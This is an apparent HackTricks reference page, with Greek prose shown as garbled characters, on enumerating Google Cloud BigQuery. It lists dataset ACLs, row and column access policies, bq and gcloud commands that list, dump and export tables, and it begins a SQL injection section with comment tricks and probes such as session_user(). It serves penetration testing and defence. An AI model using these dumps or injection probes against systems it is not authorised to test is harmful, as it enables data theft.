# GCP - Bigquery Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Î¤Î¿ Google Cloud BigQuery ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± **Ï€Î»Î®ÏÏ‰Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î·, Ï‡Ï‰ÏÎ¯Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎµÏ€Î¹Ï‡ÎµÎ¯ÏÎ·ÏƒÎ· Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½**, Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Î½Ï„Î±Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ Î³Î¹Î± **Î±Î½Î¬Î»Ï…ÏƒÎ· Ï€Î¬Î½Ï‰ Î±Ï€ÏŒ Ï€ÎµÏ„Î±Î²Î¬Ï„** Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î· Î­Ï„ÏƒÎ¹ Î¼ÎµÎ³Î¬Î»Î·Ï‚ ÎºÎ»Î¯Î¼Î±ÎºÎ±Ï‚ ÏƒÏÎ½Î¿Î»Î± Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ¬. Î©Ï‚ Î Î»Î±Ï„Ï†ÏŒÏÎ¼Î± Ï‰Ï‚ Î¥Ï€Î·ÏÎµÏƒÎ¯Î± (PaaS), Ï€Î±ÏÎ­Ï‡ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï…Ï€Î¿Î´Î¿Î¼Î® ÎºÎ±Î¹ ÎµÏÎ³Î±Î»ÎµÎ¯Î± Î³Î¹Î± Î½Î± Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Î¿Ï…Î½ Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î·Î½ Î±Î½Î¬Î³ÎºÎ· Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î·Ï‚ ÎµÏ€Î¿Ï€Ï„ÎµÎ¯Î±Ï‚.

Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **ANSI SQL**. Î¤Î± ÎºÏÏÎ¹Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± ÎµÎ¯Î½Î±Î¹ **ÏƒÏÎ½Î¿Î»Î± Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ **Ï€Î¯Î½Î±ÎºÎµÏ‚** Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ SQL **Î´ÎµÎ´Î¿Î¼Î­Î½Î±**.

### Encryption

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± **ÎºÎ»ÎµÎ¹Î´Î¯ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î· Google**, Î±Î½ ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î­Î½Î± **ÎºÎ»ÎµÎ¹Î´Î¯ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î¿ Ï€ÎµÎ»Î¬Ï„Î·Ï‚ (CMEK)**. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¹Ï‡Î¸ÎµÎ¯ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚ Î±Î½Î¬ ÏƒÏÎ½Î¿Î»Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ Î±Î½Î¬ Ï€Î¯Î½Î±ÎºÎ± Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± ÏƒÏÎ½Î¿Î»Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.

### Expiration

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¹Ï‡Î¸ÎµÎ¯ Î¼Î¹Î± **Ï‡ÏÎ¿Î½Î¹ÎºÎ® Î»Î®Î¾Î· ÏƒÏ„Î¿ ÏƒÏÎ½Î¿Î»Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Î½Î­Î¿Ï‚ Ï€Î¯Î½Î±ÎºÎ±Ï‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏÎ½Î¿Î»Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î½Î± **Î´Î¹Î±Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î±** Ï„Î¿Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ Î·Î¼ÎµÏÏÎ½ Î¼ÎµÏ„Î¬ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±.

### External Sources

Î¤Î¿ Bigquery ÎµÎ¯Î½Î±Î¹ Î²Î±Î¸Î¹Î¬ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î¿ Î¼Îµ Î¬Î»Î»ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Ï„Î·Ï‚ Google. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï†Î¿ÏÏ„Ï‰Î¸Î¿ÏÎ½ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Ï€ÏŒ ÎºÎ¬Î´Î¿Ï…Ï‚, pub/sub, google drive, Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ RDS...

### Dataset ACLs

ÎŒÏ„Î±Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± ÏƒÏÎ½Î¿Î»Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, **ÏƒÏ…Î½Î´Î­Î¿Î½Ï„Î±Î¹ ACLs** Î³Î¹Î± Î½Î± Î´ÏÏƒÎ¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒ. Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î´Î¯Î½Î¿Î½Ï„Î±Î¹ **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î™Î´Î¹Î¿ÎºÏ„Î®Ï„Î·** ÏƒÏ„Î¿Î½ **Ï‡ÏÎ®ÏƒÏ„Î· Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿ÏÏÎ³Î·ÏƒÎµ** Ï„Î¿ ÏƒÏÎ½Î¿Î»Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± **Î™Î´Î¹Î¿ÎºÏ„Î®Ï„Î·Ï‚** ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î± **projectOwners** (Î™Î´Î¹Î¿ÎºÏ„Î®Ï„ÎµÏ‚ Ï„Î¿Ï… Î­ÏÎ³Î¿Ï…), **Î£Ï…Î³Î³ÏÎ±Ï†Î­Î±Ï‚** ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î± **projectWriters,** ÎºÎ±Î¹ **Î‘Î½Î±Î³Î½ÏÏƒÏ„Î·Ï‚** ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î± **projectReaders**:
```bash
bq show --format=prettyjson <proj>:<dataset>

...
"access": [
{
"role": "WRITER",
"specialGroup": "projectWriters"
},
{
"role": "OWNER",
"specialGroup": "projectOwners"
},
{
"role": "OWNER",
"userByEmail": "gcp-admin@hacktricks.xyz"
},
{
"role": "OWNER",
"userByEmail": "support@hacktricks.xyz"
},
{
"role": "READER",
"specialGroup": "projectReaders"
}
],
...
```
### ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ Î ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î“ÏÎ±Î¼Î¼ÏÎ½ Î Î¯Î½Î±ÎºÎ±

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¹Ï‚ Î³ÏÎ±Î¼Î¼Î­Ï‚ Ï€Î¿Ï… Î­Î½Î±Ï‚ ÎºÏÏÎ¹Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î±Î½ Ï€Î¯Î½Î±ÎºÎ±** Î¼Îµ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î³ÏÎ±Î¼Î¼ÏÎ½. Î‘Ï…Ï„Î­Ï‚ Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ [**DDL**](https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create\_row\_access\_policy\_statement).\
Î— Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¿ÏÎ¯Î¶ÎµÎ¹ Î­Î½Î± Ï†Î¯Î»Ï„ÏÎ¿ ÎºÎ±Î¹ **Î¼ÏŒÎ½Î¿ Î¿Î¹ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡ÎµÏ‚ Î³ÏÎ±Î¼Î¼Î­Ï‚** Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï†Î¯Î»Ï„ÏÎ¿ Î¸Î± ÎµÎ¯Î½Î±Î¹ **Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼ÎµÏ‚** Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ ÎºÏÏÎ¹Î¿Ï…Ï‚.
```sql
# Create
CREATE ROW ACCESS POLICY apac_filter
ON project.dataset.my_table
GRANT TO ('user:abc@example.com')
FILTER USING (region = 'APAC');

# Update
CREATE OR REPLACE ROW ACCESS POLICY
CREATE ROW ACCESS POLICY sales_us_filter
ON project.dataset.my_table
GRANT TO ('user:john@example.com',
'group:sales-us@example.com',
'group:sales-managers@example.com')
FILTER USING (region = 'US');

# Check the Post Exploitation tricks to see how to call this from the cli
```

```bash
# Enumerate row policies on a table
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies
```
### Columns Access Control

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Î“Î¹Î± Î½Î± Ï€ÎµÏÎ¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ÏƒÏ„Î®Î»Î·Ï‚:

1. **ÎŸÏÎ¯ÏƒÏ„Îµ Î¼Î¹Î± Ï„Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ· ÎºÎ±Î¹ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚**. Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ ÎºÎ±Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯Ï„Îµ Î¼Î¹Î± Ï„Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ· ÎºÎ±Î¹ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Î³Î¹Î± Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÎ±Ï‚. [https://console.cloud.google.com/bigquery/policy-tags](https://console.cloud.google.com/bigquery/policy-tags)
2. Î ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÎ¬: Î”ÏÏƒÏ„Îµ Ï„Î¿Î½ **ÏÏŒÎ»Î¿ Î‘Î½Î±Î³Î½ÏÏƒÏ„Î· Î›ÎµÏ€Ï„Î¿Î¼ÎµÏÎ¿ÏÏ‚ ÎšÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÎµ Î­Î½Î± Î® Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Ï€ÏÏŒÏƒÏ‰Ï€Î±** ÏƒÎµ Î¼Î¯Î± Î® Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î±Ï€ÏŒ Ï„Î¹Ï‚ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ±Ï„Îµ.
3. **Î‘Î½Î±Î¸Î­ÏƒÏ„Îµ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ ÏƒÏ„Î¹Ï‚ ÏƒÏ„Î®Î»ÎµÏ‚ BigQuery ÏƒÎ±Ï‚**. Î£Ï„Î¿ BigQuery, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚ ÏƒÏ‡Î®Î¼Î±Ï„Î¿Ï‚ Î³Î¹Î± Î½Î± Î±Î½Î±Î¸Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÏ„Î¹ÎºÎ­Ï„Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ ÏƒÎµ ÎºÎ¬Î¸Îµ ÏƒÏ„Î®Î»Î· ÏŒÏ€Î¿Ï… Î¸Î­Î»ÎµÏ„Îµ Î½Î± Ï€ÎµÏÎ¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·.
4. **Î•Ï€Î¹Î²Î¬Î»ÎµÏ„Îµ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î·Î½ Ï„Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ·**. Î— ÎµÏ€Î¹Î²Î¿Î»Î® Ï„Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Ï… Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€ÏÎ¿ÎºÎ±Î»ÎµÎ¯ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï„Ï‰Î½ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î³Î¹Î± ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ ÏƒÏ„Î·Î½ Ï„Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ·.
5. **Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¹Ï‚ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚**. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ [Identity and Access Management](https://cloud.google.com/iam) (IAM) Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Î³Î¹Î± Î½Î± Ï€ÎµÏÎ¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎºÎ¬Î¸Îµ ÎµÏ„Î¹ÎºÎ­Ï„Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚. Î— Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Î¹ÏƒÏ‡ÏÎµÎ¹ Î³Î¹Î± ÎºÎ¬Î¸Îµ ÏƒÏ„Î®Î»Î· Ï€Î¿Ï… Î±Î½Î®ÎºÎµÎ¹ ÏƒÏ„Î·Î½ ÎµÏ„Î¹ÎºÎ­Ï„Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚.

ÎŒÏ„Î±Î½ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÏ„Î®Î»Î·Ï‚ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Î¿Ï… ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î¿Ï‚, Ï„Î¿ BigQuery **ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î·Î½ ÎµÏ„Î¹ÎºÎ­Ï„Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Ï„Î·Ï‚ ÏƒÏ„Î®Î»Î·Ï‚ ÎºÎ±Î¹ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Ï„Î·Ï‚ Î³Î¹Î± Î½Î± Î´ÎµÎ¹ Î±Î½ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿Ï‚ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±**.

{% hint style="success" %}
Î©Ï‚ ÏƒÏÎ½Î¿ÏˆÎ·, Î³Î¹Î± Î½Î± Ï€ÎµÏÎ¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÏƒÏ„Î®Î»ÎµÏ‚ ÏƒÎµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÏ„Î¹ÎºÎ­Ï„Î± ÏƒÏ„Î· ÏƒÏ„Î®Î»Î· ÏƒÏ„Î¿ ÏƒÏ‡Î®Î¼Î± ÎºÎ±Î¹ Î½Î± Ï€ÎµÏÎ¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÏƒÏ„Î·Î½ ÎµÏ„Î¹ÎºÎ­Ï„Î± ÎµÏ€Î¹Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î·Î½ Ï„Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ· Ï„Î·Ï‚ ÎµÏ„Î¹ÎºÎ­Ï„Î±Ï‚.
{% endhint %}

Î“Î¹Î± Î½Î± ÎµÏ€Î¹Î²Î¬Î»ÎµÏ„Îµ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î·Î½ Ï„Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ·, ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±:
```bash
gcloud services enable bigquerydatapolicy.googleapis.com
```
Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ Ï„Ï‰Î½ ÏƒÏ„Î·Î»ÏÎ½ Î¼Îµ: 

{% code overflow="wrap" %}
```bash
bq show --schema <proj>:<dataset>.<table>

[{"name":"username","type":"STRING","mode":"NULLABLE","policyTags":{"names":["projects/.../locations/us/taxonomies/2030629149897327804/policyTags/7703453142914142277"]},"maxLength":"20"},{"name":"age","type":"INTEGER","mode":"NULLABLE"}]
```
{% endcode %}

### ÎšÎ±Ï„Î±Î¼Î­Ï„ÏÎ·ÏƒÎ·

{% code overflow="wrap" %}
```bash
# Dataset info
bq ls # List datasets
bq ls -a # List all datasets (even hidden)
bq ls <proj>:<dataset> # List tables in a dataset
bq show --format=prettyjson <proj>:<dataset> # Get info about the dataset (like ACLs)

# Tables info
bq show --format=prettyjson <proj>:<dataset>.<table> # Get table info
bq show --schema <proj>:<dataset>.<table>  # Get schema of a table

# Get entries from the table
bq head <dataset>.<table>
bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
bq extract <dataset>.<table> "gs://<bucket>/table*.csv" # Use the * so it can dump everything in different files

# Insert data
bq query --nouse_legacy_sql 'INSERT INTO `digital-bonfire-410512.importeddataset.tabletest` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
bq insert dataset.table /tmp/mydata.json

# Get permissions
bq get-iam-policy <proj>:<dataset> # Get dataset IAM policy
bq show --format=prettyjson <proj>:<dataset> # Get dataset ACLs
bq get-iam-policy <proj>:<dataset>.<table> # Get table IAM policy
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies

# Taxonomies (Get the IDs from the shemas of the tables)
gcloud data-catalog taxonomies describe <taxonomi-ID> --location=<location>
gcloud data-catalog taxonomies list --location <location> #Find more
gcloud data-catalog taxonomies get-iam-policy <taxonomi-ID> --location=<location>

# Get jobs executed
bq ls --jobs=true --all=true
bq show --location=<location> show --format=prettyjson --job=true <job-id>

# Misc
bq show --encryption_service_account # Get encryption service account
```
{% endcode %}

### BigQuery SQL Injection

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· ÏƒÏ„Î¿ blog: [https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac). Î•Î´Ï Î¸Î± Î´Î¿Î¸Î¿ÏÎ½ Î¼ÏŒÎ½Î¿ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚.

**Î£Ï‡ÏŒÎ»Î¹Î±**:

* `select 1#from here it is not working`
* `select 1/*between those it is not working*/` Î‘Î»Î»Î¬ Î¼ÏŒÎ½Î¿ Î· Î±ÏÏ‡Î¹ÎºÎ® Î´ÎµÎ½ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹
* `select 1--from here it is not working`

Î Î¬ÏÏ„Îµ **Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚** ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ **Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½** ÏŒÏ€Ï‰Ï‚:

* Î¤ÏÎ­Ï‡Ï‰Î½ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚: `select session_user()`
* ID Î­ÏÎ³Î¿Ï…: `select @@project_id`

Î£Ï…Î³ÎºÎµÎ½Ï„ÏÏÏƒÏ„Îµ Î³ÏÎ±Î¼Î¼Î­Ï‚:

* ÎŒÎ»Î± Ï„Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï€Î¹Î½Î¬ÎºÏ‰Î½: `string_agg(table_name, ', ')`

Î Î¬ÏÏ„Îµ **datasets**, **tables** ÎºÎ±Î¹ **column** Î¿Î½ÏŒÎ¼Î±Ï„Î±:

* **ÎŒÎ½Î¿Î¼Î± Î­ÏÎ³Î¿Ï…** ÎºÎ±Î¹ **dataset**: 

